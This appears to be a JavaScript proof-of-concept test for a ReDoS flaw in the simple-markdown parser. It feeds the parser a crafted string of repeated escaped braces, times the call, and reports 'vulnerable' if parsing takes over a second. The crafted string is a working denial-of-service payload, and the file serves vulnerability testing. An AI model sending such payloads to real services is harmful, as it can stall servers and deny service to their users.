// test("ReDos in simple-markdown", () => {
  const genstr = require("../utils").genstr;
  const measureTime = require("../utils").measureTime;
  const SimpleMarkdown = require("simple-markdown");
  const mdParse = SimpleMarkdown.defaultBlockParse;
  let t = measureTime(function () {
    mdParse(
      "~~\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}}~"
    );
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
